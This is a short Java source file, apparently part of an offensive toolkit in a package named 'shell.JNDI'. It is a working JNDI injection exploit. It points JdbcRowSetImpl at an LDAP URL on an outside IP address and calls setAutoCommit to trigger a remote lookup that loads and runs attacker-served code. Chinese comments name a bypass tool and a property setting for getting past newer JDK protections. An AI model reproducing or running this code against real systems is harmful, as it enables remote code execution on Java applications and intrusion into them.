package shell.JNDI;

import com.sun.rowset.JdbcRowSetImpl;

public class test {
    public static void main(String[] args) {
        String payload = "ldap://1.116.136.120:8888/test";//可使用LdapBypassJndi工具
//        String payload = "ldap://127.0.0.1:1399/test";
        try {
            Jndieval(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void Jndieval(String payload) throws Exception{
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");//绕过jdk191+
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(payload);//设置exp，通过getDataSourceName获得
        jdbcRowSet.setAutoCommit(true);//调用connect()
    }
}
